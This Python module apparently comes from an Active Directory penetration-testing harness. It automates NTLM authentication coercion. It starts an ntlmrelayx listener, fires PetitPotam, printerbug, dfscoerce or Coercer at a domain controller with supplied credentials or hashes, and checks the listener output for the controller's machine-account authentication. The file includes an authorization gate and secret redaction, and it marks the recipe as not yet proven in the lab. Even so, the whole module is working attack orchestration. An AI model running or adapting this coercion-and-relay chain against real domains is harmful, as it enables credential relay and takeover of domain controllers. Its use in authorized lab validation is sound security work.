"""COERCION validation executor -- FULL (T1c-2), listener-based.

Encodes the COERCION recipe (claude-mem #66146 C8, recipe-known-not-run) as a
listener + trigger chain on the ADR-001 :class:`ProcessManager` chassis:

    start a capture listener (ntlmrelayx -socks / minimal SMB capture) on
        <listener_host>
    fire a coercion trigger (Coercer multiplexer / PetitPotam / printerbug /
        dfscoerce) at <victim_dc> pointing back at <listener_host>
    poll the listener output until the victim MACHINE account (<DC>$)
        authenticates to us -- the captured auth IS the proof
    stop the listener

Terminal fact: ``authn_success`` -- the victim DC's machine account authenticated
to our listener. **Non-mutating** (we only receive an authentication; no AD
object is written), so there is no rollback. A timeout with no captured auth is
an honest ``inconclusive`` (collection incomplete), never a proof.

``verified_recipe = False``: the recipe is known but NOT proven end-to-end on
GOAD (#66146 C8). It ships honest -- ``AutoConfirm`` skips it unless the operator
passes ``include_unverified`` -- and all tool invocations + success markers are
UNVERIFIED (flagged below, to be pinned at the first real lab run).

Secrets rule: the captured authentication (and any relayed material) is
presence-detected only; nothing secret reaches the receipt. The predicate is the
non-secret machine-account name appearing in an authentication line; the proof
token is over public identifiers only.

Scoring identity (ad-lab-harness ``truth/GOAD-proof.json``): COERCION keys on
``{host_id}`` (dc01/dc02/dc03). ``target_identity`` resolves the (overridable)
``victim_dc`` host through ``config.host_aliases`` so the receipt target carries
``host_id``.

UNVERIFIED ASSUMPTIONS (pin in-lab, mirroring laps.py / adcs_esc1.py):
* the capture-listener invocation (``impacket-ntlmrelayx -smb2support -socks`` as
  a capture-only listener binding the local interface);
* the coercion-trigger invocations (``Coercer coerce`` / ``PetitPotam.py`` /
  ``printerbug.py`` / ``dfscoerce.py``);
* the captured-auth marker (an ``Authenticating``/``received connection`` line
  naming the ``<DC>$`` machine account). If the real wording differs the chain
  gets no positive predicate and honestly reports not-proved/inconclusive.
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Any, Optional

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv)
from .process_manager import poll_for_capture


# ---- coercion method choices (UNVERIFIED invocations -- see module docstring) --
COERCION_METHODS = ("auto", "petitpotam", "printerbug", "dfscoerce")

# Authentication-context keywords that, together with the <DC>$ machine-account
# name, mean the victim actually authenticated to our listener. Matching the SAM
# name alone is not enough (it could appear in a benign log line), so a positive
# capture requires BOTH the machine account AND an auth keyword.
_AUTH_KEYWORDS = (
    "authenticating", "authenticated", "received connection", "relaying",
    "ntlmv2", "ntlmssp", "succeed",
)


def _short_name(host: str) -> str:
    """The computer sAMAccountName root for a host (short DNS label)."""
    return (host or "").split(".", 1)[0]


def machine_account(host: str) -> str:
    """The machine account sAMAccountName for ``host`` (``<shortname>$``)."""
    short = _short_name(host)
    return f"{short}$" if short else ""


def captured_auth(output: str, sam: str) -> bool:
    """Positive capture predicate: ``sam`` (``<DC>$``) appears in the listener
    output in an authentication context. Both the machine account AND an auth
    keyword must be present, so an incidental mention is not a false capture."""
    if not sam:
        return False
    low = (output or "").lower()
    if sam.lower() not in low:
        return False
    return any(keyword in low for keyword in _AUTH_KEYWORDS)


def coercion_trigger_argv(method: str, victim_dc: str, listener_host: str,
                          cfg) -> list[str]:
    """Build a coercion-trigger argv for ``method`` (UNVERIFIED invocations).

    ``auto`` uses the Coercer multiplexer (its own petitpotam->printerbug->
    dfscoerce fallback); the named methods call the single-vector tools. Secrets
    ride ``-p``/``-hashes`` (or an impacket ``domain/user:pass@host`` target) so
    :func:`redact_argv` masks them in any stored argv.
    """
    user = cfg.username or ""
    domain = cfg.domain
    secret: list[str] = []
    if cfg.nt_hash:
        secret = ["-hashes", cfg.nt_hash]
    elif cfg.password is not None:
        secret = ["-p", cfg.password]
    if method == "printerbug":
        # printerbug.py takes an impacket target + the listener to call back to.
        tgt = f"{domain}/{user}"
        if cfg.password is not None:
            tgt += f":{cfg.password}"
        return ["printerbug.py", f"{tgt}@{victim_dc}", listener_host]
    if method == "petitpotam":
        return ["PetitPotam.py", "-u", user, "-d", domain, *secret,
                listener_host, victim_dc]
    if method == "dfscoerce":
        return ["dfscoerce.py", "-u", user, "-d", domain, *secret,
                listener_host, victim_dc]
    # auto -> coercer multiplexer (scan then coerce every reachable method).
    # Binary is lowercase 'coercer' (the Coercer entry point on Kali/kali-vr).
    return ["coercer", "coerce", "-u", user, "-d", domain, *secret,
            "-t", victim_dc, "-l", listener_host]


class CoercionExecutor(ValidationExecutor):
    technique = "COERCION"
    technique_class = "coerce"
    terminal_kind = "authn_success"
    mutating = False
    verified_recipe = False   # recipe-known-not-run (#66146 C8)
    recipe_ref = ("#66146 C8 COERCION = start capture listener ; Coercer/PetitPotam/"
                  "printerbug trigger at <victim_dc> -> <listener_host> ; captured "
                  "<DC>$ auth is the proof (recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        victim = finding.host or ""
        return [
            ParamSpec(
                name="victim_dc", kind="target_host",
                description="The DC/host to coerce into authenticating to our "
                            "listener. Use its hostname so the machine account "
                            "(<shortname>$) resolves.",
                recommended=victim,
                rationale="The host of the aranum coercion finding (#66142).",
            ),
            ParamSpec(
                name="listener_host", kind="target_host",
                description="Host our capture listener binds / the coercion points "
                            "back at. Empty = framework-managed on the local "
                            "interface; set it for an operator-run relay box.",
                recommended="",
                rationale="Framework-managed by default (the #66142 'automatically "
                          "validate' UX); override to an operator-positioned "
                          "listener (ADR-001 Decision 2).",
                required=False,
            ),
            ParamSpec(
                name="method", kind="free",
                description="Coercion vector: 'auto' (Coercer multiplexer) or a "
                            "single vector (petitpotam/printerbug/dfscoerce).",
                recommended="auto",
                rationale="Coercer's scan+coerce multiplexer tries every reachable "
                          "vector; override to force one (research 3.3).",
                choices=list(COERCION_METHODS),
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        # COERCION facet keys on {host_id}: resolve the (overridable) victim DC
        # host through host_aliases so the receipt target carries host_id.
        victim = (params["victim_dc"].value if "victim_dc" in params else None) \
            or finding.host or ""
        return ctx.config.resolve_target_identity(victim)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        listener = v.get("listener_host") or "<local>"
        sam = machine_account(v["victim_dc"])
        return [
            f"start capture listener on {listener} (ntlmrelayx -smb2support -socks)",
            f"coerce ({v['method']}) {v['victim_dc']} -> {listener}",
            f"poll listener for captured auth from {sam or '<DC>$'}",
            "stop listener (captured auth = proof; non-mutating, no rollback)",
        ]

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        victim_dc = v["victim_dc"]
        listener_host = v.get("listener_host") or ""
        method = v.get("method") or "auto"
        sam = machine_account(victim_dc)
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok,
                                    argv_display=redact_argv(argv),
                                    returncode=res.returncode if res else None, note=note))

        # Gate the active coercion op (non-mutating, but it drives traffic).
        verdict = ctx.authorizer.authorize(
            "coerce", {"victim_dc": victim_dc, "listener_host": listener_host or "<local>"})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "coerce"
            errors.append("gate_denied:coerce")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "coerce"

        # 1) start the capture listener (non-blocking). UNVERIFIED invocation.
        listener_argv = ["impacket-ntlmrelayx", "-smb2support", "-socks"]
        handle = None
        try:
            handle = ctx.proc_manager.start(listener_argv, cwd=str(out_dir))
        except OSError as exc:
            record("start_listener", listener_argv, None, False, note=f"spawn failed: {exc}")
            errors.append("listener_start_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        record("start_listener", listener_argv, None, True, note=f"listener on {listener_host or '<local>'}")

        try:
            # 2) fire the coercion trigger (synchronous). UNVERIFIED invocation.
            trig_argv = coercion_trigger_argv(method, victim_dc, listener_host or ctx.config.dc_ip, cfg)
            res = ctx.runner.run(trig_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
            fired = not (res.timed_out or res.error)
            record("coerce_trigger", trig_argv, res, fired,
                   note=f"method={method}" + ("" if fired else " (trigger did not run)"))

            # 3) poll the listener for the captured <DC>$ authentication.
            output, captured = poll_for_capture(
                ctx.proc_manager, handle,
                success=lambda out: captured_auth(out, sam),
                interval_s=cfg.poll_interval_s, timeout_s=cfg.tool_timeout_s)
        finally:
            final_out = ctx.proc_manager.stop(handle)
        captured = captured or captured_auth(final_out, sam)
        record("capture_auth", listener_argv,
               RunResult(returncode=None), captured,
               note=f"captured {sam} auth" if captured else "no captured auth")

        if not captured:
            errors.append("coercion_no_capture")
            return self._artifact(steps, gate, mutation, None, False, errors)

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=True, impersonated=sam,
            predicate=(f"coerced {victim_dc} ({method}): its machine account {sam} "
                       "authenticated to our capture listener"),
            proof_token=proof.proof_token("COERCION", cfg.domain, victim_dc, sam,
                                          "coerced_auth"),
            extra={"victim": sam, "method": method})
        return self._artifact(steps, gate, mutation, terminal_fact, True, errors)

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
